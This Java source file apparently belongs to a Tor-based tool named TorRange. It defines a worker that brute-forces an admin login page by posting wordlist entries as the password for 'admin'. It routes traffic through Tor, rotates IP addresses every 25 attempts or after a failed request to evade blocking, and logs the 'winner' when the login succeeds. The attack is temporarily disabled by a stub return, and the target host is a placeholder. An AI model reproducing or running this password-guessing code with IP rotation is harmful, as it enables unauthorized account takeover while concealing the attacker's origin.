package com.object0r.TorRange.applications.wordlist;

import com.object0r.TorRange.ProxyWorkerManager;
import com.object0r.TorRange.TorWorker;
import com.object0r.TorRange.helpers.TorRangeHttpHelper;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class WordlistConsumerWorker extends TorWorker
{
    public int threadCounter = 0;
    WordlistConsumerWorkerManager manager;

    public WordlistConsumerWorker(ProxyWorkerManager manager, final int id)
    {
        super(manager, id);
        this.manager = (WordlistConsumerWorkerManager) manager;

    }

    public void process(String entry)
    {
        System.out.println("Entry: " + entry);
        try
        {
            Thread.sleep(500);
        }
        catch (InterruptedException e)
        {
            e.printStackTrace();
        }
        if (true)
        {
            return;
        }
        String page = TorRangeHttpHelper.postRequest("https://ccffdd/admin/login.php", "username=admin&password=" + entry + "&Submit=Login", getProxy(), false, "");
        if (page == null)
        {
            changeIp();
            process(entry);

            return;
        }

        else if (!page.contains("Some String."))
        {
            logWinner(page, entry);
        }

        try
        {
            if (threadCounter++ % 25 == 0)
            {
                //System.out.println("Changing ip");
                changeIp();
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public void logWinner(String page, String entry)
    {
        try
        {
            System.out.println("We have a winner: " + entry);
            manager.logWinner(page, entry);
            System.exit(0);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
